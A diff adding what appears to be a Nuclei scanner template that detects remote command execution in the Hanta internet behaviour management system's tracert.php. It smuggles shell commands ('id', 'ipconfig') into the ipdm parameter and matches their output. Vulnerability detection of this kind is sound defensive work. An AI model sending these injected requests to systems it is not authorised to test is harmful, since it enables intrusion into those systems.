@@ -1,0 +1,35 @@
+id: hnata-ac-tracert-rce
+info:
+  name: 上海汉塔网络科技有限公司上网行为管理系统 tracert.php - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/hIKXCTHWS3vqytNrsFI6xw
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips: 资产过少无法验证
+  tags: hanta,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dgn/dgn_tools/tracert.php?ipdm=2;id"
+      - "{{BaseURL}}/dgn/dgn_tools/tracert.php?ipdm=2;ipconfig"
+        
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+        condition: or
+
+      - type: status
+        status:
+          - 200
